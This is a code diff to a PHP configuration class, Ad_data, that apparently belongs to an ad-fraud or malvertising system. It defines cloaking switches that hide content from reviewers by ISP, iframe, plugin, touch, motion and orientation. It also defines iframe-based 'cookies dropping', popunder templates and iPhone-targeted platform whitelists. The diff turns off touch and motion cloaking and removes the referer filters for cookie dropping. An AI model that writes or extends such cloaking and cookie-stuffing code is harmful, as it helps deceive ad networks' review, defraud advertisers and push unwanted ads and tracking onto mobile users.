@@ -34,8 +34,8 @@ class Ad_data {
 	public $ispCloakingEnabled = true;
 	public $iframeCloakingEnabled = true;
 	public $pluginCloakingEnabled = true;
-	public $touchCloakingEnabled = true;
-	public $motionCloakingEnabled = true;
+	public $touchCloakingEnabled = false;
+	public $motionCloakingEnabled = false;
 	public $orientationCloakingEnabled = true;
 	public $blacklistedReferrers = array();
 	public $whitelistedReferrers = array();
@@ -58,12 +58,6 @@ class Ad_data {
 
     public $cookies_dropping_enabled = false;
     public $cookies_dropping_method = COOKIES_DROPPING_METHOD_IFRAME;
-
-    public $cookies_dropping_referer_blacklist = array();
-    public $cookies_dropping_referer_whitelist = array();
-
-    public $cookies_dropping_landing_page_referer_blacklist = array();
-    public $cookies_dropping_landing_page_referer_whitelist = array();
 
     public $platform_whitelist = array('iphone','linux armv');
     public $user_agent_whitelist = array('iphone','linux armv');
@@ -113,10 +107,6 @@ class Ad_data {
         $this->popunder_template                = !array_key_exists("PopunderTemplate", $config)?$this->popunder_template:json_decode($config["PopunderTemplate"],true)["html"];
         $this->cookies_dropping_enabled                = !array_key_exists("CookiesDroppingEnabled", $config)?$this->cookies_dropping_enabled:($config["CookiesDroppingEnabled"] === "true" ? true : false);
         $this->cookies_dropping_method				= array_key_exists("CookiesDroppingMethod", $config) ? $config["CookiesDroppingMethod"] : $this->cookies_dropping_method;
-        $this->cookies_dropping_referer_blacklist 			= array_key_exists("CookiesDroppingRefererBlacklist", $config) ? preg_split("/\|/", $config["CookiesDroppingRefererBlacklist"], -1, PREG_SPLIT_NO_EMPTY) : $this->cookies_dropping_referer_blacklist;
-        $this->cookies_dropping_referer_whitelist 			= array_key_exists("CookiesDroppingRefererWhitelist", $config) ? preg_split("/\|/", $config["CookiesDroppingRefererWhitelist"], -1, PREG_SPLIT_NO_EMPTY) : $this->cookies_dropping_referer_whitelist;
-        $this->cookies_dropping_landing_page_referer_blacklist 			= array_key_exists("CookiesDroppingLPRefererBlacklist", $config) ? preg_split("/\|/", $config["CookiesDroppingLPRefererBlacklist"], -1, PREG_SPLIT_NO_EMPTY) : $this->cookies_dropping_landing_page_referer_blacklist;
-        $this->cookies_dropping_landing_page_referer_whitelist 			= array_key_exists("CookiesDroppingLPRefererWhitelist", $config) ? preg_split("/\|/", $config["CookiesDroppingLPRefererWhitelist"], -1, PREG_SPLIT_NO_EMPTY) : $this->cookies_dropping_landing_page_referer_whitelist;
         $this->platform_whitelist 			= array_key_exists("PlatformWhiteList", $config) ? preg_split("/\|/", $config["PlatformWhiteList"], -1, PREG_SPLIT_NO_EMPTY) : $this->platform_whitelist;
         $this->user_agent_whitelist 		= $this->platform_whitelist; //	= array_key_exists("UserAgentWhiteList", $config) ? preg_split("/\|/", $config["UserAgentWhiteList"], -1, PREG_SPLIT_NO_EMPTY) : $this->user_agent_whitelist;
 	}
